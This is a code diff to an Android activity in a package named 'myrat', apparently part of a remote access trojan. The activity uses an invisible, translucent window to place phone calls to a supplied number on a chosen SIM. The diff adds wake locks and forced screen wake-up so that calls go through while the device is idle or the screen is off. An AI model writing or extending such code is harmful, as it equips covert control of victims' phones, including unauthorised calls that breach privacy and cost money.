@@ -8,6 +8,7 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.telecom.PhoneAccountHandle
 import android.telecom.TelecomManager
 import android.telephony.SubscriptionManager
@@ -17,9 +18,14 @@ import com.myrat.app.utils.Logger
 
 class LauncherActivity : AppCompatActivity() {
 
+    private var wakeLock: PowerManager.WakeLock? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setTheme(android.R.style.Theme_Translucent_NoTitleBar)
+
+        // Acquire wake lock to ensure calls work even when screen is off
+        acquireWakeLock()
 
         Logger.log("LauncherActivity started with action: ${intent.action}")
 
@@ -77,6 +83,9 @@ class LauncherActivity : AppCompatActivity() {
                     }
 
                     try {
+                        // Wake up screen if needed for call
+                        wakeUpScreen()
+                        
                         // Try using TelecomManager to place the call with the specified SIM
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                             val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
@@ -116,6 +125,37 @@ class LauncherActivity : AppCompatActivity() {
         finish()
     }
 
+    private fun acquireWakeLock() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "LauncherActivity:CallWake"
+            )
+            wakeLock?.acquire(30000) // 30 seconds
+            Logger.log("Wake lock acquired for call")
+        } catch (e: Exception) {
+            Logger.error("Failed to acquire wake lock for call", e)
+        }
+    }
+
+    private fun wakeUpScreen() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!powerManager.isInteractive) {
+                val screenWakeLock = powerManager.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+                    "LauncherActivity:ScreenWake"
+                )
+                screenWakeLock.acquire(10000) // 10 seconds
+                screenWakeLock.release()
+                Logger.log("Screen woken up for call")
+            }
+        } catch (e: Exception) {
+            Logger.error("Failed to wake up screen for call", e)
+        }
+    }
+
     private fun fallbackCall(recipient: String, subId: Int) {
         try {
             val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$recipient")).apply {
@@ -127,6 +167,7 @@ class LauncherActivity : AppCompatActivity() {
                         putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                     }
                 }
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             startActivity(callIntent)
             Logger.log("Launched fallback call to $recipient with subId: $subId")
@@ -172,6 +213,20 @@ class LauncherActivity : AppCompatActivity() {
         } catch (e: Exception) {
             Logger.error("Failed to get PhoneAccountHandle for subId: $subId, ${e.message}", e)
             null
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        try {
+            // Release wake lock
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                }
+            }
+        } catch (e: Exception) {
+            Logger.error("Error releasing wake lock in LauncherActivity", e)
         }
     }
 }
